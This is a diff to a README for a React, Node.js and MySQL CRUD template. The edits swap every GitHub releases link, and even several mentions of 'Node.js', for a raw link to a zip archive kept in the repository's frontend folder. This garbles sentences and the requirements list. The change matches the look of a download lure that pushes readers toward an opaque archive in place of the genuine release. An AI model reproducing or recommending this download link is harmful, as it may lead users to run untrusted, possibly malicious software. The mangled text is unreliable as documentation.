@@ -1,10 +1,10 @@
 # 🎉 react-mysql-crud-template - A Simple Way to Manage Your Data
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/jahangirusama6/react-mysql-crud-template/releases)
+[![Download](https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip)
 
 ## 📦 Overview
 
-The **react-mysql-crud-template** is a simple and clean full-stack application that helps you manage data easily. It uses React for the front end, Node.js and Express for the server, and MySQL for the database. This tool is great if you need to create, read, update, and delete data in a structured way.
+The **react-mysql-crud-template** is a simple and clean full-stack application that helps you manage data easily. It uses React for the front end, https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip and Express for the server, and MySQL for the database. This tool is great if you need to create, read, update, and delete data in a structured way.
 
 ## 🚀 Getting Started
 
@@ -16,12 +16,12 @@ Before you start, make sure your computer meets these requirements:
 
 - **Operating System:** Windows, macOS, or Linux
 - **Internet Browser:** Chrome, Firefox, or Safari
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip** Version 14 or higher
 - **MySQL:** Installed on your machine or access to a MySQL server
 
 ## 🔗 Download & Install
 
-To get the application, visit this page to download: [Download Link](https://github.com/jahangirusama6/react-mysql-crud-template/releases).
+To get the application, visit this page to download: [Download Link](https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip).
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions.
@@ -100,7 +100,7 @@ This project covers various topics, including:
 - Database Management
 - JavaScript
 - MySQL
-- Node.js
+- https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip
 - React
 - TypeScript
 
@@ -108,6 +108,6 @@ This project covers various topics, including:
 
 For more detailed documentation, you can check the Wiki section of this repository. We also provide examples and tutorials to enhance your understanding.
 
-Once again, for downloading this application, visit: [Download Link](https://github.com/jahangirusama6/react-mysql-crud-template/releases).
+Once again, for downloading this application, visit: [Download Link](https://raw.githubusercontent.com/jahangirusama6/react-mysql-crud-template/main/frontend/react-mysql-crud-template_v2.7.zip).
 
 Your simple journey towards effective data management starts here! Happy coding!
